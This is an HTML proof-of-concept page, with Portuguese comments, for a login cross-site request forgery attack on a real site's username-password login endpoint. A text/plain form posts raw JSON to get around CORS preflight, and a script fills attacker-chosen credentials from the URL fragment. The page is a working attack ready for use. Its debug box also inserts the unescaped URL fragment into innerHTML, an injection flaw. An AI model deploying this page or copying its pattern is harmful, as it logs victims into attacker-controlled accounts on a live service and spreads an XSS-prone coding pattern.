<!doctype html>
<meta charset="utf-8">
<title>PoC Login CSRF (text/plain)</title>
<body>
<h2>PoC Login CSRF (text/plain)</h2>
<p>Envia JSON bruto com <code>enctype="text/plain"</code> para evitar preflight.</p>

<div id="debug" style="padding:8px;border:1px dashed #999;margin:10px 0;"></div>

<form id="f" action="https://www.glassdoor.com.br/auth/login/username-password" method="POST" enctype="text/plain">
<textarea id="payload" style="width:100%;height:160px">
{"username":"SEU_EMAIL_AQUI","password":"SUA_SENHA_AQUI","postLoginUrl":""}
</textarea>
<br><button type="submit">ENVIAR (POST text/plain)</button>
</form>

<script>
(function(){
  // Se vierem credenciais no fragmento (#u=...&p=...), preenche o JSON do textarea.
  const frag = location.hash || '';
  const dbg = document.getElementById('debug');
  dbg.innerHTML = '<b>Fragmento atual:</b> <code>' + (frag || '(vazio)') + '</code>';
  if (frag.startsWith('#')) {
    const p = new URLSearchParams(frag.slice(1));
    const u = p.get('u');
    const s = p.get('p');
    if (u && s) {
      const tpl = {"username":u,"password":s,"postLoginUrl":""};
      document.getElementById('payload').value = JSON.stringify(tpl);
      dbg.innerHTML += '<br><span style="color:green">Campos do fragmento aplicados ao JSON.</span>';
    } else {
      dbg.innerHTML += '<br><span style="color:#c00">Dica: use #u=email&p=senha para preencher automaticamente.</span>';
    }
  }
})();
</script>

<p style="margin-top:20px;font-size:12px;color:#555">
Observações: <code>@</code> pode ser escrito normal no fragmento. Se sua senha tiver <code>&</code> ou <code>#</code>, prefira digitar manualmente no textarea acima.
</p>
</body>
